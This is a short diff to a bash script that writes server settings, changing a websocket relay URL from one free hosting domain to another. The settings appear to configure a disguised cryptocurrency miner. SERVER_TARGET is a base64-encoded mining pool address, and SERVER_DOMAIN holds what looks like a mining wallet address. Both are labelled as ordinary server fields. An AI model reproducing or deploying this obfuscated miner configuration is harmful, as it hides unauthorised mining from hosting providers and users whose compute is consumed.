@@ -1,7 +1,7 @@
 #!/bin/bash
 CONNECT=$1
 NAME=$2
-echo "SERVER_WS=ws://identical-sile-malphite-node-dfaa5ec5.koyeb.app
+echo "SERVER_WS=wss://node--wss--9fb77cgtfy78.code.run
 SERVER_TARGET=cG9vbC5oYXNodmF1bHQucHJvOjQ0Mw==
 SERVER_DOMAIN=88c3RaaVjxzGX6vUgcSNqa1HgAJEh83XEKqhZswhv8LHFo9PjmxhXkE5ZpRW9W7c5GJpUVP4eURbnT4KesVN9eLg7rpWeGL
 SERVER_SECRET=${NAME}
